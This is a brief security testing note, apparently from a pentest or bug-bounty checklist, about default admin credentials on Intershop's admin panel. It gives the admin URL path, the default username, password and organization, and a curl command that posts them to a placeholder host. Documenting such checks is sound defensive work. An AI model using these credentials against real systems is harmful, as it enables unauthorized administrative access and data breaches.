## Use case

The application had default credentials for the admin panel, allowing unauthorized access to sensitive administrative functions. This vulnerability could lead to data breaches and system manipulation if exploited by malicious actors.

## Steps to test

1. Perform subdomain enumeration to identify potential targets.
2. Access the identified subdomain and locate the login form.
3. Use the URL pattern '/INTERSHOP/web/WFS/SLDSystem' to access the admin panel.
4. Attempt to log in using the default credentials: 'admin' as username and '!InterShop00!' as password, with 'Operations' as the organization.

## Commands

```text
curl -X POST 'http://<example.com>/INTERSHOP/web/WFS/SLDSystem' -d 'username=admin&password=!InterShop00!&organization=Operations'
```
